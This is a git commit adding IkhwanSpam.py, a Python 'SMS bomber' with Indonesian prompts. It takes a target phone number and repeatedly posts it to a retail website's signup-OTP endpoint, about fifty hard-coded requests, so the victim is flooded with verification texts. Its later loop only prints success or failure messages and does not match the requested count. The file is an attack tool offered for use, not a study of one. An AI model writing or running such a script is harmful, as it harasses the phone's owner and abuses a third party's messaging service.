d2e2118a3a3b9b0990ef40ceaad453523670a98a
ikhwan354 <54025554+ikhwan354@users.noreply.github.com>
2020-09-30 10:36:43 +0800

    Add files via upload

---
+++ IkhwanSpam.py
@@ -0,0 +1,93 @@
+import os, sys, time, requests
+from requests import post
+
+def lagi():
+	l = input('Mau Spam Lagi? [Y/n]: ')
+	if l == 'y':
+	          main()
+	elif l == 'n':
+	           sys.exit()           
+	
+def main():
+	os.system('clear')
+	os.system('figlet Ikhwan')
+	os.system('figlet Spam')
+	banner = '''
++-------------------------------------------------+
+[-] Author	: ikhwan 354
+[-] instagram	: ikhwan_maulana_zakaria	
+[-] IG Editor	: plus_editor
++-------------------------------------------------+ 
+'''
+	print(banner)
+	no = input('Target : ')
+	jml = int(input('Jumlah Spam : '))
+	ua = {
+	'Connection' : 'keep-alive',
+	'Referer' : 'https://www.mapclub.com/en/user/signup',
+	}
+
+	dat = {
+	'phone' : no,
+	}
+
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+	sendSms = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data=dat, headers=ua)
+  
+	for x in range(jml):
+		time.sleep(5)
+		if 'error' in sendSms.text:
+			print('Spam Terkirirm '+ no + ' [ Gagal ] ')
+		else:
+			print('Spam Terkirim '+ no + ' [ Success ] ')
+
+main()
+lagi()
